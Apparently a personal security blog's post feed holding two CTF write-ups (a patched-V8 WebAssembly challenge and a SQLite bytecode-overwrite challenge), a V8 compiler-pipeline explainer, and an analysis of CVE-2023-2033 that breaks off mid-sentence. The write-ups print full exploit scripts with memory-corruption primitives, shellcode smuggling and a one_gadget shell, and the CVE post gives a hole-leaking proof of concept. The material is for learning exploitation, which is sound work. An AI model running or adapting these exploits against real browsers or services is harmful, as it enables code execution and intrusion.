[{"content":"Introduction I tried this challenge during the CTF but wasnt able to solve it. The challenge had 0 solves in the end. So I tried solving it after the CTF ended.\nPatch Analysis 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 diff --git a/src/objects/objects.cc b/src/objects/objects.cc index 71c4b37adcc..0f670bdd7d1 100644 --- a/src/objects/objects.cc +++ b/src/objects/objects.cc @@ -2228,8 +2228,9 @@ Maybe\u0026lt;bool\u0026gt; Object::SetPropertyInternal(LookupIterator* it, } case LookupIterator::WASM_OBJECT: - RETURN_FAILURE(it-\u0026gt;isolate(), kThrowOnError, - NewTypeError(MessageTemplate::kWasmObjectsAreOpaque)); + //RETURN_FAILURE(it-\u0026gt;isolate(), kThrowOnError, + // NewTypeError(MessageTemplate::kWasmObjectsAreOpaque)); + return SetDataProperty(it, value); case LookupIterator::INTERCEPTOR: { if (it-\u0026gt;HolderIsReceiverOrHiddenPrototype()) { With this patch, instead of returning a failure and throwing a TypeError indicating that WASM objects are opaque, the code now calls SetDataProperty(it, value), allowing us to modify the properties of the WASM_OBJECT.\nExploitation Helper Functions 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 let fi_buf = new ArrayBuffer(8); let f_buf = new Float64Array(fi_buf); let i_buf = new BigUint64Array(fi_buf); function ftoi(f) { f_buf[0] = f; return i_buf[0]; } function itof(i) { i_buf[0] = i; return f_buf[0]; } function lower(i) { return i\u0026amp;BigInt(0xffffffff); } function upper(i){ return (i\u0026gt;\u0026gt;32n)\u0026amp;BigInt(0xffffffff); } function hex(i) { start = \u0026#34;\u0026#34;; content = i.toString(16); return start + \u0026#34;0x\u0026#34; + content; } Building WebAssembly Module We can build a WebAssembly module using the wasm-module-builder.js in our exploit script.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 d8.file.execute(`test/mjsunit/wasm/wasm-module-builder.js`); let builder = new WasmModuleBuilder(); let array = builder.addArray(kWasmI32, true); builder.addFunction(\u0026#39;createArray\u0026#39;, makeSig([kWasmI32], [kWasmExternRef])) .addBody([ kExprLocalGet, 0, kGCPrefix, kExprArrayNewDefault, array, kGCPrefix, kExprExternConvertAny, ]) .exportFunc(); makeSig([kWasmI32], [kWasmExternRef]) defines the function signature, It takes a i32 parameter and returns an external reference. This function essentially takes an argument and creates an array with that argument as its size. Then using kExprExternConvertAny it creates an external reference so that it can be used in JavaScript.\nConstructing Primitives When adding properties to an object, V8 usually places them in the property array. In case of Wasm Objects, It doesnt have a property array. Lets create an array and see how the object layout is in wasm object\u0026rsquo;s case.\n1 var w_array = wasm.createArray(0x1337); We can see that the size is placed right after the map, where, in a typical JSObject, the properties array would be located. However, since this is a Wasm Object, it lacks a properties array, and due to the patch, we can manipulate these values.\nSo we can store any address in the size and directly change the values in that address. Now lets try to do that.\nObject layout of arr1\n1 2 3 0x24c6081f46f1 \u0026lt;JSArray[1]\u0026gt; V8 version 12.7.224.12 d8\u0026gt; 1 2 3 pwndbg\u0026gt; x/8gx 0x24c6081f46f1-1 0x24c6081f46f0: 0x08000725081cce15 0x0000000208394db5 0x24c6081f4700: 0x0000000808000635 0x0000000000000004 The size is stored as size\u0026lt;\u0026lt;1 which is the upper part of 0x0000000208394db5. We now create an array using the wasm module with the address as its size and overwrite that address with a large value.\n1 2 var w_array = wasm.createArray(0x81f46f9); // address of arr + 8 w_array[0] = 0xffff; Now if we check the size, we can see that it is overwritten.\n1 2 3 4 5 %DebugPrint(arr1); console.log(arr1.length) var w_array = wasm.createArray(0x81f4791); w_array[0] = 0xffff; console.log(arr1.length) 1 2 3 4 5 0x0b01081f4789 \u0026lt;JSArray[1]\u0026gt; 1 65535 V8 version 12.7.224.12 d8\u0026gt; Now that we have overwritten the array size we now have out of bounds access. Using this we construct addrof and fakeobj primitives.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 let arr1 = [{}]; let arr2 = [1.1]; . . . function addrof(obj){ arr1[0]=obj; return lower(ftoi(arr2[2])); } function fakeobj(addr){ arr2[2]=itof(addr); return arr1[0]; } Now let\u0026rsquo;s turn these into arbitrary read and write. For that we need to construct a fake object whose values are under our control.\nLets take a look at an array object\n1 let temp = [1.1,2.2]; 1 2 3 0x045d0808f2a5 \u0026lt;JSArray[2]\u0026gt; V8 version 12.7.224.12 d8\u0026gt; 1 2 pwndbg\u0026gt; x/gx 0x045d0808f2a5-1 0x45d0808f2a4: 0x08000725081cce15 We can use that as the map value for our fake object since we want the fake object to be a float array. The next four bytes should have the address of the properties array and the next four is the length. for example:\n1 2 pwndbg\u0026gt; x/gx 0x045d0808f2a5+8-1 0x45d0808f2ac: 0x000000040808f2bd Then we call fakeobj at the start of this fake structure which gives us an object we can totally control.\n1 2 3 4 5 6 let temp = [1.1,2.2]; temp[0] = itof(0x08000725081cce15n); temp[1] =itof(0x1fffe\u0026lt;\u0026lt;32n); temp_addr = addrof(temp); fake_object = fakeobj(temp_addr+0x20n); Now we can change the address part of the second value in the structure to read or write to any memory, this gives us arbitrary read and write.\n1 2 3 4 5 6 7 8 9 function arb_write(addr,val){ temp_addr[1]=itof((0x1fffen\u0026lt;\u0026lt;32n)+addr-8n); fake_object[0]=itof(val); } function arb_read(addr){ temp_addr[1]=itof((0x1fffen\u0026lt;\u0026lt;32n)+addr-8n); return ftoi(fake_object[0]); } So what\u0026rsquo;s next? How do we escape the v8 sandbox and get RIP control?\nIf we look at the build arguments provided, we can see that v8_enable_external_code_space is set to false. On default (set to true), the code pointer it stored in a seperate region than the v8 heap. Now that its disabled, the code pointer is still there in v8 heap region. You can refer to this blog for detailed explanation about this.\nTo simply put, Jitted Function objects have a code pointer. At an offset to this address we have code_entry_point pointer. This consists of the instructions which are going to be executed when the function is called. So if we overwrite that entry point value, we can hijack the control flow.\n1 2 3 4 pwn_addr = addrof(pwn); var code = lower(arb_read(pwn_addr+0xcn)); var code_entry_rwx = arb_read(code+0x14n); arb_write(code+0x14n,code_entry_rwx+0x60n); We smuggle the shellcode into the jitted function by converting it into floating-point numbers so that it is stored in hexadecimal form in memory. So we overwrite the code entry point to starting of the smuggled shellcode.\nFull Exploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 d8.file.execute(\u0026#39;test/mjsunit/wasm/wasm-module-builder.js\u0026#39;); let fi_buf = new ArrayBuffer(8); let f_buf = new Float64Array(fi_buf); let i_buf = new BigUint64Array(fi_buf); function ftoi(f) { f_buf[0] = f; return i_buf[0]; } function itof(i) { i_buf[0] = i; return f_buf[0]; } function lower(i) { return i\u0026amp;BigInt(0xffffffff); } function upper(i){ return (i\u0026gt;\u0026gt;32n)\u0026amp;BigInt(0xffffffff); } function hex(i) { start = \u0026#34;\u0026#34;; content = i.toString(16); return start + \u0026#34;0x\u0026#34; + content; } function pwn(){ return [ 1.95538254221075331056310651818E-246, 1.95606125582421466942709801013E-246, 1.99957147195425773436923756715E-246, 1.95337673326740932133292175341E-246, 2.63486047652296056448306022844E-284]; }; let arr1 = [{}]; let arr2 = [1.1]; for(let i=0;i\u0026lt;0x10000;i++) pwn(); let builder = new WasmModuleBuilder(); let array = builder.addArray(kWasmI32, true); builder.addFunction(\u0026#39;createArray\u0026#39;, makeSig([kWasmI32], [kWasmExternRef])) .addBody([ kExprLocalGet, 0, kGCPrefix, kExprArrayNewDefault, array, kGCPrefix, kExprExternConvertAny, ]) .exportFunc(); function write_val(arr,val){ arr[0] = val; return; } let instance = builder.instantiate({}); let wasm = instance.exports; var w_array = wasm.createArray(0x082d0641+8); w_array[0] = 0xffff; console.log(\u0026#34;Target arr length --\u0026gt; \u0026#34; + arr2.length) function addrof(obj){ arr1[0]=obj; return lower(ftoi(arr2[2])); } function fakeobj(addr){ arr2[2]=itof(addr); return arr1[0]; } function arb_write(addr,val){ temp[1]=itof((0x1fffen\u0026lt;\u0026lt;32n)+addr-8n); fake_object[0]=itof(val); } function arb_read(addr){ temp[1]=itof((0x1fffen\u0026lt;\u0026lt;32n)+addr-8n); return ftoi(fake_object[0]); } let temp = [1.1,1.1] temp[0] = itof(0x08000725081cce15n); temp[1] =itof(0x1fffen\u0026lt;\u0026lt;32n); temp_addr = addrof(temp); console.log(hex(temp_addr.toString(16))); fake_object = fakeobj(temp_addr+0x20n); pwn_addr = addrof(pwn); var code = arb_read(pwn_addr+0xcn) \u0026amp;0xffffffffn; console.log(hex(code.toString(16))); var code_start = arb_read(code+0x14n) arb_write(code+0x14n,code_start+0x60n); console.log(\u0026#34;Pwned!!\u0026#34;); pwn(); Conclusion It was fun solving this, thanks to @phoen1xxx for helping me out with the challenge. If you find any mistakes or have any doubts/suggestions feel free to contact me :)\n","date":"2024-08-22T16:55:07+05:30","permalink":"https://sanjayvardhan.github.io/posts/ctfzone-quals-2024-wasminator/","title":"CTFZone Quals 2024 - Wasminator"},{"content":"Introduction I played IrisCTF last week and found Sequilitis really interesting. Although I wasn\u0026rsquo;t able to solve it during the CTF, I worked on it afterward. The challenge uses the SQLite3 engine, so we need to understand SQLite3 internals before diving into the challenge.\nSqlite3 Internals SQLite3 uses a bytecode engine. First, it translates SQL statements into bytecode, and then the generated bytecode runs in a VM. Each instruction is 24 bytes, i.e., 6 ints. The opcode takes the first 4 bytes, and the arguments take the rest. To take a look at the bytecode, we can use the Explain keyword, which gives us the bytecode of the SQL statement instead of executing it in the VM.\nYou can take a look at all the opcodes here.\nBug Analysis The challenge essentially involves four things:\nAdding a query. Executing the query. Deleting the query. Exiting. The functionality is pretty straightforward, but there is a hidden function called inscribe(), which is where the bug lies.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 void inscribe(sqlite3_stmt **stmt) { if(*stmt == NULL) { printf(\u0026#34;There is no prepared statement at this location.\\n\u0026#34;); return; } int amount = *(int *)((void *)*stmt + 0x90); unsigned char *tome = *(unsigned char **)((void *)*stmt + 0x88); printf(\u0026#34;How many characters will you inscribe (up to %d)? \u0026#34;, amount * 24); int actual = 0; scanf(\u0026#34;%d\u0026#34;, \u0026amp;actual); getchar(); if(actual \u0026lt;= 0 || actual \u0026gt; amount * 24) { printf(\u0026#34;Invalid amount.\\n\u0026#34;); return; } printf(\u0026#34;Inscribe your message: \u0026#34;); for (size_t i = 0; i \u0026lt; actual; i++) { *tome = getchar(); ++tome; } printf(\u0026#34;\\nIt has been done.\\n\u0026#34;); } The function takes the query index as the input and then allows us to overwrite the bytecode of that query.\nGetting Leaks We know from the bytecode that the engine only handles 32-bit values. But how does it handle values that exceed this limit? The answer is that it uses pointers instead. For the query select 0x1122334455, this is the memory layout of the bytecode:\nIt handles queries like SELECT 1.1 in the same way.\nNow, what if we overwrite the last byte of the pointer with an address that points to some useful heap location? This would result in a heap leak. By exploiting this heap leak, we can achieve arbitrary read access on the heap. Utilizing this, we can leak the PIE address and then leak the printf GOT to obtain the libc address.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 def leak_val(addr): bytecode = generate_opcode(8, 0, 0, 0, 4, 0, 0) + p8(72) + p8(243) + p16(0) + p32(0) + p32(1) + p32(0) + addr sl(b\u0026#34;5\\n1\\n\u0026#34; + str(len(bytecode)).encode()); sl(bytecode) sla(b\u0026#34;It has been done.\u0026#34;, b\u0026#34;2\u0026#34;) sl(b\u0026#34;1\u0026#34;) ru(b\u0026#34;? \u0026#34;) return int(rl().decode().split(\u0026#34;,\u0026#34;)[0]) heap = leak_val(b\u0026#34;\\xe0\u0026#34;) heap = heap - 0xe008 log.info(\u0026#34;heap --\u0026gt; \u0026#34; + hex(heap)) baseleak = leak_val(p64(heap + 0x640)) base_addr = baseleak - 0xe3d87 log.info(\u0026#34;base addr --\u0026gt; \u0026#34; + hex(base_addr)) printf = leak_val(p64(base_addr + 0x11aed8)) libc.address = printf - 0x606f0 log.info(\u0026#34;libc --\u0026gt; \u0026#34; + hex(libc.address)) Now that we have all the leaks we need, We have to figure out how to get RIP control.\nGetting RIP Control After looking at the opcodes, We can see that function opcode can help us get RIP control.\nHere is the opcode description for Function:\n1 Invoke a user function (P4 is a pointer to an sqlite3_context object that contains a pointer to the function to be run) with arguments taken from register P2 and successors. The number of arguments is in the sqlite3_context object that P4 points to. The result of the function is stored in register P3. Register P3 must not be one of the function inputs.\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;P1 is a 32-bit bitmask indicating whether or not each argument to the function was determined to be constant at compile time. If the first argument was constant then bit 0 of P1 is set. This is used to determine whether meta data associated with a user function argument using the sqlite3_set_auxdata() API may be safely retained until the next invocation of this opcode.| Here are some useful structs:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 struct sqlite3_context { Mem *pOut; /* The return value is stored here */ FuncDef *pFunc; /* Pointer to function information */ Mem *pMem; /* Memory cell used to store aggregate context */ Vdbe *pVdbe; /* The VM that owns this context */ int iOp; /* Instruction number of OP_Function */ int isError; /* Error code returned by the function. */ u8 enc; /* Encoding to use for results */ u8 skipFlag; /* Skip accumulator loading if true */ u8 argc; /* Number of arguments */ sqlite3_value *argv[1]; /* Argument set */ }; struct FuncDef { i8 nArg; /* Number of arguments. -1 means unlimited */ u32 funcFlags; /* Some combination of SQLITE_FUNC_* */ void *pUserData; /* User data parameter */ FuncDef *pNext; /* Next function with same name */ void (*xSFunc)(sqlite3_context*,int,sqlite3_value**); /* func or agg-step */ void (*xFinalize)(sqlite3_context*); /* Agg finalizer */ void (*xValue)(sqlite3_context*); /* Current agg value */ void (*xInverse)(sqlite3_context*,int,sqlite3_value**); /* inverse agg-step */ const char *zName; /* SQL name of the function. */ union { FuncDef *pHash; /* Next with a different name but the same hash */ FuncDestructor *pDestructor; /* Reference counted destructor function */ } u; /* pHash if SQLITE_FUNC_BUILTIN, pDestructor otherwise */ }; If we fake these structures and overwrite the function pointer with a one_gadget, it will spawn a shell. To achieve this, we need to craft a fake sqlite3_context that points to a fake FuncDef. This FuncDef must contain the target pointer.\nFake sqlite3_context:\n1 2 3 4 5 6 7 8 payload = p64(0) payload += p64(ptr1+0x38) #FuncDef *pFunc; which is now our controlled pointer. payload += p64(0) payload += p64(0) payload += p32(0) + p32(0) payload += p8(0) + p8(0) payload += p16(0) + p32(0) payload += p64(ptr1+0x64) #nulls Fake FuncDef:\n1 2 3 4 5 payload += p8(0) payload += p8(0) + p16(0) payload += p32(0) + p64(0) payload += p64(0) payload += p64(oneGadget) # func* xSFunc --\u0026gt; out target function ptr Now that we have the fake structures ready, we will write them into memory by editing a query (1). Then, we\u0026rsquo;ll make another query (2) to overwrite it with a function call, and subsequently execute it.\n1 2 3 4 5 edit_query(1, len(payload), payload) new_query(2, b\u0026#34;SELECT 1.0\u0026#34;) bytecode = generate_opcode(66, 241, 0, 0, 0, 0, ptr1) edit_query(2, len(bytecode), bytecode) exec_query(2) This should spawn us a shell!\nYou can find challenge files and exploit script here\n","date":"2024-01-13T14:02:58+05:30","permalink":"https://sanjayvardhan.github.io/posts/irisctf-2024-sequilitis/","title":"IrisCTF 2024 - Sequilitis"},{"content":"Understanding V8\u0026rsquo;s Compiler Pipeline Introduction V8 is the JavaScript engine powering browsers like Google Chrome, Brave, and Microsoft Edge. This series of blog posts will go into the internals of V8. This first part will be giving an overview of the V8 Compiler Pipeline.\nCompiler Pipeline High-Level Overview: The Life Cycle of a JavaScript Source in the V8 Engine Just-In-Time (JIT) Compilation involves executing bytecode through an interpreter VM, which is slower than running machine code directly. Most compilers, including V8, follow a similar initial compilation pipeline:\nSource Code to Abstract Syntax Tree (AST) AST to Bytecode V8 begins by converting source code into tokens, which are then transformed into an AST. This AST is subsequently converted into V8 bytecode. The AST serves as an Intermediate Representation (IR), providing a layer of abstraction used for translation and optimization.\nParser JavaScript code first passes through a parser, which breaks down the code into tokens (a process called tokenization). These tokens are then converted into an Abstract Syntax Tree (AST).\nIgnition Ignition, the interpreter stage, walks through the AST, converting it into V8 bytecode and executing it.\nSparkplug Sparkplug is a non-optimizing compiler stage that iterates over the bytecode generated by Ignition, converting it into machine code for each bytecode as it loops.\nMaglev Maglev marks the start of optimizations in machine code. It\u0026rsquo;s a mid-tier optimizing compiler that converts machine code into SSA (Static Single Assignment) nodes. This phase mainly involves two stages: building a graph and optimizing phi values.\nTurbofan In the Turbofan phase, JIT compilation occurs, translating bytecode into highly optimized machine code.\nHot Functions and Tiered Compilation When a JavaScript function is executed repeatedly, it becomes \u0026lsquo;hot\u0026rsquo; and is sent to the next tier in the pipeline. Each tier gathers profiling information during multiple executions, aiding speculative optimization. To validate the optimized code, checks are placed in the optimized code. If the function behaves unexpectedly, i.e the checks fail, it deoptimizes\nWhy Is Optimization Necessary? Consider a simple operation like a + b. In JavaScript, unlike ahead-of-time compiled languages like C/C++, the engine doesn\u0026rsquo;t initially know the types of the variables involved. The operation could be an integer addition or a string concatenation. Based on the ECMAScript Specification, V8 performs various checks whenever it encounters a \u0026ldquo;+\u0026rdquo; to determine the correct operation.\nHere\u0026rsquo;s the ECMAScript Specification for the \u0026ldquo;+\u0026rdquo; Operator:\n1 2 3 4 5 6 7 13.8.1 The Addition Operator ( + ) NOTE The addition operator either performs string concatenation or numeric addition. 13.8.1.1 Runtime Semantics: Evaluation AdditiveExpression : AdditiveExpression + MultiplicativeExpression 1. Return ? EvaluateStringOrNumericBinaryExpression(AdditiveExpression, +, MultiplicativeExpression). 1 2 3 4 5 6 7 8 13.15.4 EvaluateStringOrNumericBinaryExpression ( leftOperand, opText, rightOperand ) The abstract operation EvaluateStringOrNumericBinaryExpression takes arguments leftOperand (a Parse Node), opText (a sequence of Unicode code points), and rightOperand (a Parse Node) and returns either a normal completion containing either a String, a BigInt, or a Number, or an abrupt completion. It performs the following steps when called: 1. Let lref be ? Evaluation of leftOperand. 2. Let lval be ? GetValue(lref). 3. Let rref be ? Evaluation of rightOperand. 4. Let rval be ? GetValue(rref). 5. Return ? ApplyStringOrNumericBinaryOperator(lval, opText, rval). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 13.15.3 ApplyStringOrNumericBinaryOperator ( lval, opText, rval ) The abstract operation ApplyStringOrNumericBinaryOperator takes arguments lval (an ECMAScript language value), opText (**, *, /, %, +, -, \u0026lt;\u0026lt;, \u0026gt;\u0026gt;, \u0026gt;\u0026gt;\u0026gt;, \u0026amp;, ^, or |), and rval (an ECMAScript language value) and returns either a normal completion containing either a String, a BigInt, or a Number, or a throw completion. It performs the following steps when called: 1. If opText is +, then a. Let lprim be ? ToPrimitive(lval). b. Let rprim be ? ToPrimitive(rval). c. If lprim is a String or rprim is a String, then i. Let lstr be ? ToString(lprim). ii. Let rstr be ? ToString(rprim). iii. Return the string-concatenation of lstr and rstr. d. Set lval to lprim. e. Set rval to rprim. 2. NOTE: At this point, it must be a numeric operation. 3. Let lnum be ? ToNumeric(lval). 4. Let rnum be ? ToNumeric(rval). 5. If Type(lnum) is not Type(rnum), throw a TypeError exception. 6. If lnum is a BigInt, then a. If opText is **, return ? BigInt::exponentiate(lnum, rnum). b. If opText is /, return ? BigInt::divide(lnum, rnum). c. If opText is %, return ? BigInt::remainder(lnum, rnum). d. If opText is \u0026gt;\u0026gt;\u0026gt;, return ? BigInt::unsignedRightShift(lnum, rnum). 7. Let operation be the abstract operation associated with opText and Type(lnum) in the following table: opText\tType(lnum)\toperation **\tNumber\tNumber::exponentiate *\tNumber\tNumber::multiply *\tBigInt\tBigInt::multiply /\tNumber\tNumber::divide %\tNumber\tNumber::remainder +\tNumber\tNumber::add +\tBigInt\tBigInt::add -\tNumber\tNumber::subtract -\tBigInt\tBigInt::subtract \u0026lt;\u0026lt;\tNumber\tNumber::leftShift \u0026lt;\u0026lt;\tBigInt\tBigInt::leftShift \u0026gt;\u0026gt;\tNumber\tNumber::signedRightShift \u0026gt;\u0026gt;\tBigInt\tBigInt::signedRightShift \u0026gt;\u0026gt;\u0026gt;\tNumber\tNumber::unsignedRightShift \u0026amp;\tNumber\tNumber::bitwiseAND \u0026amp;\tBigInt\tBigInt::bitwiseAND ^\tNumber\tNumber::bitwiseXOR ^\tBigInt\tBigInt::bitwiseXOR |\tNumber\tNumber::bitwiseOR |\tBigInt\tBigInt::bitwiseOR 8. Return operation(lnum, rnum). All these steps for a seemingly simple addition highlight why optimization is crucial. V8 engages in \u0026ldquo;speculation\u0026rdquo; during the execution of JavaScript code, collecting information to use when the engine decides to tier up, thus producing optimized code.\nSpeculative Optimization Due to the dynamic nature of JavaScript, there\u0026rsquo;s little initial information about the code to be executed. Consider a function func adding two variables x and y, which are expected to be numbers. V8 can optimize by skipping checks if it knows x and y are numbers through repeated execution and profiling.\nAfter Ignition generates the bytecode, the bytecode runs for a while. This is when the code gets ‘hot’. Meanwhile, it gathers feedback and stores it in the Feedback Vector(which is the structure containing the profiling data)``\nThe Feedback Vector stores all the information about the loads, stores, etc. This bytecode, along with the feedback vector, is fed into the next tier of the compilation pipeline.\nThe purpose of this process is to speculate about the code and produce optimized code.\nSea Of Nodes The Turbofan first converts each bytecode instruction into a collection of nodes which results in a representation called Sea of Nodes. It combines aspects of both Data Flow Graphs (DFG) and Control Flow Graphs (CFG).\nSea of Nodes graphs have three types of edges:\nValue Edges: Represent the flow of data between operations.\nControl Edges: Dictate the program\u0026rsquo;s control flow.\nEffect Edges: Ensure operations are executed in the correct order.\nsource: Introduction to TurboFan (doar-e.github.io)\nSo, all the optimizations happen in the sea of node graph.\nNext part of this series will be focusing on Turbofan and how it uses Sea of Nodes during various optimizations phases.\n","date":"2024-01-02T06:32:41+05:30","permalink":"https://sanjayvardhan.github.io/posts/v8-internals-understanding-v8-compiler-pipeline/","title":"V8 Internals - Understanding V8 Compiler Pipeline"},{"content":"Introduction I have been following v8 exploits related to hole for sometime now and I found CVE-2023-2033 really interesting. So I thought documenting whatever I learn while doing the analysis of this CVE will help me understand it even better.\nHole Generally in JavaScript, A Hole to an empty slot in an array. These holes are different from undefined or null values, which are actual values that can be assigned to array elements.\nFor example, if you create an array like this:\n1 2 var arr = [1, 2, 3]; arr.length = 5; The array arr will have two holes at the end.\nNow lets see how this looks like in v8, We can use %DebugPrint(arr) so get debug information of the array.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 d8\u0026gt; %DebugPrint(arr) DebugPrint: 0x38ae001c9415: [JSArray] - map: 0x38ae000cef71 \u0026lt;Map[16](HOLEY_SMI_ELEMENTS)\u0026gt; [FastProperties] - prototype: 0x38ae000ce925 \u0026lt;JSArray[0]\u0026gt; - elements: 0x38ae001cb0fd \u0026lt;FixedArray[20]\u0026gt; [HOLEY_SMI_ELEMENTS] - length: 5 - properties: 0x38ae000006cd \u0026lt;FixedArray[0]\u0026gt; - All own properties (excluding elements): { 0x38ae00000d41: [String] in ReadOnlySpace: #length: 0x38ae0030f6f9 \u0026lt;AccessorInfo name= 0x38ae00000d41 \u0026lt;String[6]: #length\u0026gt;, data= 0x38ae00000061 \u0026lt;undefined\u0026gt;\u0026gt; (const accessor descriptor), location: descriptor } - elements: 0x38ae001cb0fd \u0026lt;FixedArray[20]\u0026gt; { 0: 1 1: 2 2: 3 3-19: 0x38ae000006e9 \u0026lt;the_hole_value\u0026gt; } 0x38ae000cef71: [Map] in OldSpace - map: 0x38ae000c3c29 \u0026lt;MetaMap (0x38ae000c3c79 \u0026lt;NativeContext[285]\u0026gt;)\u0026gt; - type: JS_ARRAY_TYPE - instance size: 16 - inobject properties: 0 - unused property fields: 0 - elements kind: HOLEY_SMI_ELEMENTS - enum length: invalid - back pointer: 0x38ae000ce6b1 \u0026lt;Map[16](PACKED_SMI_ELEMENTS)\u0026gt; - prototype_validity cell: 0x38ae00000a31 \u0026lt;Cell value= 1\u0026gt; - instance descriptors #1: 0x38ae000cef3d \u0026lt;DescriptorArray[1]\u0026gt; - transitions #1: 0x38ae000cef99 \u0026lt;TransitionArray[4]\u0026gt;Transition array #1: 0x38ae00000e05 \u0026lt;Symbol: (elements_transition_symbol)\u0026gt;: (transition to PACKED_DOUBLE_ELEMENTS) -\u0026gt; 0x38ae000cefb1 \u0026lt;Map[16](PACKED_DOUBLE_ELEMENTS)\u0026gt; - prototype: 0x38ae000ce925 \u0026lt;JSArray[0]\u0026gt; - constructor: 0x38ae000ce61d \u0026lt;JSFunction Array (sfi = 0x38ae00335da5)\u0026gt; - dependent code: 0x38ae000006dd \u0026lt;Other heap object (WEAK_ARRAY_LIST_TYPE)\u0026gt; - construction counter: 0 [1, 2, 3, , ] You can see that the elements kind for this array is HOLEY_SMI_ELEMENTS. SMI is used to represent small integers. and you can see that the elements after arr[2] are holes.\nV8 uses a special object to represent these holes called TheHole. It is an internal implementation which never leaks(or should never) in the JavaScript code. since this is a special object it is handled differently in various places in v8. this special handling is what lead to a lot vulnerabilities in the past.\nSetup 1 2 3 4 5 6 7 8 spektre@skream:~$ fetch v8 spektre@skream:~$ cd v8 spektre@skream:~/v8$ ./build/install-build-deps.sh # Assumes you\u0026#39;re using apt spektre@skream:~/v8$ git checkout f7a3499f6d7e50b227a17d2bbd96e4b59a261d3c spektre@skream:~/v8$ ./tools/dev/v8gen.py x64.release spektre@skream:~/v8$ ninja -C ./out.gn/x64.release # Release version spektre@skream:~/v8$ ./tools/dev/v8gen.py x64.debug spektre@skream:~/v8$ ninja -C ./out.gn/x64.debug # Debug version Bug Analysis POC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 var h0le = [Object]; function boom() { var h00le = h0le; function rGlobal() { h00le[0] = stack; return h00le; } Error.captureStackTrace(globalThis); Error.prepareStackTrace = function() { Reflect.deleteProperty(Error, \u0026#39;prepareStackTrace\u0026#39;); Reflect.deleteProperty(globalThis, \u0026#39;stack\u0026#39;); Reflect.defineProperty( globalThis, \u0026#39;stack\u0026#39;, {configurable: false, writable: true, enumerable: true, value: 1}); stack = undefined; for (let i = 0; i \u0026lt; 0x5000; i++) { rGlobal(); } return undefined; }; Reflect.defineProperty( globalThis, \u0026#39;stack\u0026#39;, {configurable: true, writable: true, enumerable: true, value: undefined}); delete globalThis.stack; rGlobal(); %DebugPrint(h0le[0]); } boom(); First, we call Error.captureStackTrace():\nThis function captures the current stack trace and stores it in a private symbol property. It creates a “v8 api/native accessor” (AccessorInfo) property for stack. In V8, AccessorInfo objects are used to store information about custom getter and setter functions. Overriding Error.prepareStackTrace:\nThe prepareStackTrace function is redefined by the user. This function is called whenever the stack property of an Error object is accessed. Call Object.defineProperty on globalThis, \u0026ldquo;stack\u0026rdquo;, with the specified properties {...}:\nTo define a property descriptor, it\u0026rsquo;s necessary to first get the current property descriptor. This action invokes JSReceiver::GetOwnPropertyDescriptor. Since stack is an AccessorInfo (and not a standard \u0026ldquo;JavaScript accessor\u0026rdquo; represented by AccessorPair), the process involves calling Object::GetProperty. This leads to the invocation of the user-defined Error.prepareStackTrace function, which formats the stack trace. Invoke the user-defined Error.prepareStackTrace function during the execution of Object.defineProperty:\nDelete the Old \u0026lsquo;stack\u0026rsquo; Property: Remove the existing stack property from globalThis, using its configurable attribute set to true.\nDefine a New \u0026lsquo;stack\u0026rsquo; Data Property: Create a new stack data property on globalThis. This property is made writable but non-configurable.\nTransition PropertyCell Type: Modify the stack property to change its PropertyCell type to kMutable.\nTrigger TurboFan Optimization: Optimize the function loading stack with TurboFan (V8\u0026rsquo;s optimizing compiler), due to the new status of stack as a non-configurable and mutable property.\nOptimize LoadGlobal Operation: Optimize the LoadGlobal operation to load from a HeapConstant PropertyCell. Bypass De-optimization Checks: No lazy de-optimization compilation dependencies are installed during this process. After the user-defined Error.prepareStackTrace function completes, Object.defineProperty() continues with the descriptor returned earlier (which does not reflect the changes made inside Error.prepareStackTrace).\nThe stack property is updated to {value: 1, configurable: true}, contradicting the non-configurable state assumed by the JIT-optimized code.\nUpon deletion of the stack property, the PropertyCell is cleared and transitions into a state with a value known as \u0026ldquo;The Hole\u0026rdquo;.\nThe TurboFan-optimized function then tries to access the stack property, expecting a non-configurable, mutable property. Instead, it retrieves the cleared PropertyCell, which now contains \u0026ldquo;The Hole\u0026rdquo;.\nPatch Analysis There were two fixes for this bug.\nPatch 1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 diff --git [a/src/builtins/builtins-error.cc](https://chromium.googlesource.com/v8/v8/+/f7a3499f6d7e50b227a17d2bbd96e4b59a261d3c/src/builtins/builtins-error.cc) [b/src/builtins/builtins-error.cc](https://chromium.googlesource.com/v8/v8/+/fa81078cca6964def7a3833704e0dba7b05065d8/src/builtins/builtins-error.cc) index 01e0162..14c0602 100644 --- a/src/builtins/builtins-error.cc +++ b/src/builtins/builtins-error.cc @@ -35,6 +35,9 @@ THROW_NEW_ERROR_RETURN_FAILURE( isolate, NewTypeError(MessageTemplate::kInvalidArgument, object_obj)); } + if (object_obj-\u0026gt;IsJSGlobalProxy()) { + return ReadOnlyRoots(isolate).undefined_value(); + } Handle\u0026lt;JSObject\u0026gt; object = Handle\u0026lt;JSObject\u0026gt;::cast(object_obj); Handle\u0026lt;Object\u0026gt; caller = args.atOrUndefined(isolate, 2); This introduced a simple check to return undefined value If object_obj is a JSGlobalProxy I think this patch was a 